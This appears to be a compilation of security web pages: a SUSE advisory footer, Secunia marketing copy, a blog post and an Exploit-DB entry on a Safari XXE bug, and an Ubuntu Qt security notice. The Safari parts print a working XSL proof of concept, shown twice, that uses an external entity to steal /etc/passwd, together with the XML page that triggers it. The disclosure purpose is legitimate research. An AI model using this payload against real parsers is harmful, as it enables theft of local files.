3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

### Apple's Safari 4 fixes local file theft attack

Safari 4 was just released and among the various improvements is [a range of security fixes](http://www.net-security.org/advisory.php?id=10247). One of these fixes is for an XXE attack against the parsing of the XSL XML. Full technical details may be found here:

<http://scary.beasts.org/security/CESA-2009-006.html>

Or for the lazy, you can skip straight to the:

[Demo for Safari 3 / MacOS](https://cevans-app.appspot.com/static/safaristealfilebug.xml)
[Demo for Safari 3 / Windows](https://cevans-app.appspot.com/static/safaristealfilebugwin.xml)

I found it interesting that Safari 3 seemed robust against XXE attacks in general -- there are a lot of places that browsers find themselves parsing XML (XmlHttpRequest, prettifying XML mime type documents, SVG, E4X, etc.) However, the relatively obscure area of the XSL XML succumbed to an XXE attack.

(Note: awareness of XXE attacks remains low despite the issue being [documented since at least 2002)](http://www.securityfocus.com/archive/1/297714).

### Apple Safari local file theft bug

---

Programs affected: Safari prior to version 4

Severity: Websites can steal files from the victim's computer

Vendor URL (copy): [APPLE-SA-2009-06-08-1](http://www.net-security.org/advisory.php?id=10247)

Initial report: Jun 2008Safari was vulnerable to an XXE attack against a relatively obscure area of
XML parsing. As a recap, XXE (Xml eXternal Entity) attacks abuse a built-in
feature of XML to fetch files (or network resources) and embed them in an
attacker's document. XXE attacks are most common server-side; this advisory
notes a client-side attack against the Safari browser.Safari's XSL stysheets were vulnerable to XXE attacks. By having a random
XML file refer to an evil XSL resource (which is itself an XML-based format),
the attacker can steal a local file by refering to it in the XSL resource's
DTD.Here's the code for the evil DTD:
```

<!DOCTYPE doc [ <!ENTITY ent SYSTEM "file:///etc/passwd"> ] >
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
Below you should see the content of a local file, stolen by this evil web page.
<p/>
&ent
<script>
alert(document.body.innerHTML);
</script>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>

```

# Apple Safari 3.2.x - XML External Entity Local File Theft

#### EDB-ID:

###### 8907

#### CVE:

###### N/A

**EDB Verified:**

#### Author:

###### [Chris Evans](/?author=1702)

#### Type:

###### [remote](/?type=remote)

**Vulnerable App:**

```
Safari prior to version 4 may permit an evil web page to steal files
from the local system.

This is accomplished by mounting an XXE attack against the parsing of
the XSL XML. This is best explained with a sample evil XSL file which
includes a DTD that attempts the XXE attack:

<!DOCTYPE doc [ <!ENTITY ent SYSTEM "file:///etc/passwd"> ] >
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
Below you should see the content of a local file, stolen by this evil web page.
<p/>
&ent;
<script>
alert(document.body.innerHTML);
</script>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>

To mount the attack, the attacker would serve a web page which has XML
MIME type and requests to be styled by the evil stylesheet:

<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet type="text/xsl" href="safaristealfilebug.xsl"?>
<xml>
irrelevant
</xml>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# USN-857-1: Qt vulnerabilities

10 November 2009

Qt vulnerabilities

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 9.04](/security/notices?release=jaunty)
* [Ubuntu 8.10](/security/notices?release=intrepid)

## Packages

* [qt4-x11](/security/cves?package=qt4-x11) -

## Details

It was discovered that QtWebKit did not properly handle certain SVGPathList

data structures. If a user were tricked into viewing a malicious website,

an attacker could exploit this to execute arbitrary code with the

privileges of the user invoking the program. ([CVE-2009-0945](/security/CVE-2009-0945))

Several flaws were discovered in the QtWebKit browser and JavaScript

engines. If a user were tricked into viewing a malicious website, a remote

attacker could cause a denial of service or possibly execute arbitrary code

with the privileges of the user invoking the program. ([CVE-2009-1687](/security/CVE-2009-1687),

[CVE-2009-1690](/security/CVE-2009-1690), [CVE-2009-1698](/security/CVE-2009-1698), [CVE-2009-1711](/security/CVE-2009-1711), [CVE-2009-1725](/security/CVE-2009-1725))

It was discovered that QtWebKit did not properly handle certain XSL

stylesheets. If a user were tricked into viewing a malicious website,

an attacker could exploit this to read arbitrary local files, and possibly

files from different security zones. ([CVE-2009-1699](/security/CVE-2009-1699), [CVE-2009-1713](/security/CVE-2009-1713))

It was discovered that QtWebKit did not prevent the loading of local Java

applets. If a user were tricked into viewing a malicious website, an

attacker could exploit this to execute arbitrary code with the privileges

of the user invoking the program. ([CVE-2009-1712](/security/CVE-2009-1712))

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 9.04

* [libqt4-webkit](https://launchpad.net/ubuntu/%2Bsource/qt4-x11)
  -
  [4.5.0-0ubuntu4.3](https://launchpad.net/ubuntu/%2Bsource/qt4-x11/4.5.0-0ubuntu4.3)

##### Ubuntu 8.10

* [libqt4-webkit](https://launchpad.net/ubuntu/%2Bsource/qt4-x11)
  -
  [4.4.3-0ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/qt4-x11/4.4.3-0ubuntu1.4)

After a standard system upgrade you need to restart your session to effect

the necessary changes.
